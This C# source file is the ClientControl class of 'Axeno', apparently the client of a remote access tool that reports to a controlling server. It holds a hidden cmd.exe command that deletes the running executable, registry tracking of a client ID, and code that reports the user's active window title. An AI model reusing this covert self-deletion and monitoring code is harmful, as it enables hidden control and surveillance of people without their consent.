using Axeno.Client.Helper;
using Axeno.Client.MessagePack;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Axeno.Client.Networking.Functions
{
    internal class ClientControl
    {

        public static void Reconnect()
        {
            Process.Start(AppDomain.CurrentDomain.FriendlyName);
            Environment.Exit(0);
        }
        public static void Disconnect()
        {
            Environment.Exit(0);
        }
        public static void Uninstall()
        {
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            RegistryKey keyopen = Registry.CurrentUser.OpenSubKey(@"SOFTWARE", true);
            if (keyopen != null)
            {
                keyopen.DeleteSubKeyTree("AxenoSettings", false);
                keyopen.Close();
            }
            Environment.Exit(0);
        }
        public static void SaveUID(string uid)
        {
            RegistryKey keyopen = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\AxenoSettings", true);
            if (keyopen != null)
            {
                keyopen.SetValue("AxenoUID", uid, RegistryValueKind.String);
                keyopen.Close();
            }
        }
        public static void GetExistingUID()
        {
            try
            {
                RegistryKey keyopen = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\AxenoSettings");
                string axenouid = null;
                if (keyopen != null)
                {
                    if(keyopen.GetValueKind("AxenoUID") != RegistryValueKind.None)
                    {
                        axenouid = keyopen.GetValue("AxenoUID").ToString();
                        keyopen.Close();
                    }else
                    {
                        return;
                    }

                }
                if (axenouid != null)
                {
                    SendInfo.UID = axenouid;
                }
            }
            catch(Exception) { return; }

        }
        public static byte[] UpdateStats()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "UpdateInfo";
            msgpack.ForcePathObject("ActiveWin").AsString = GetActiveWindowTitle();
            msgpack.ForcePathObject("CPU%").AsString = SendInfo.CPU();
            msgpack.ForcePathObject("RAM%").AsString = SendInfo.RAM();

            return msgpack.Encode2Bytes();

        }
        public static string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                StringBuilder buff = new StringBuilder(nChars);
                IntPtr handle = GetForegroundWindow();
                if (GetWindowText(handle, buff, nChars) > 0)
                {
                    return buff.ToString();
                }
            }
            catch { }
            return "";
        }
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    }
}

